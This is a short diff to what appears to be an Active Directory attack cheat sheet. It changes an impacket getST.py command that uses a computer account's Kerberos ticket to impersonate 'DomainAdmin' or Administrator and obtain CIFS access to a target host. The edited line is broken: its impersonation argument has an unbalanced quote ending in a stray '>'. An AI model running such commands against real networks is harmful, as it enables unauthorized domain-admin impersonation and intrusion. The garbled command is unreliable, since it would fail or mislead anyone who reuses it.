@@ -37,5 +37,5 @@ getST.py -debug -spn <svc>/<target_fqdn> -impersonate <target_user|Administrator
 using the machine account TGT
 ```bash
 KRB5CCNAME=<computer_ccache>
-getST.py -debug -self -impersonate "DomainAdmin" -altservice "cifs/<target_fqdn>" -k -no-pass -dc-ip <dc_ip> <domain_fqdn>/'<computer>$' 
+getST.py -debug -self -impersonate "target_user|Administrator> -altservice "cifs/<target_fqdn>" -k -no-pass -dc-ip <dc_ip> <domain_fqdn>/'<computer>$' 
 ```
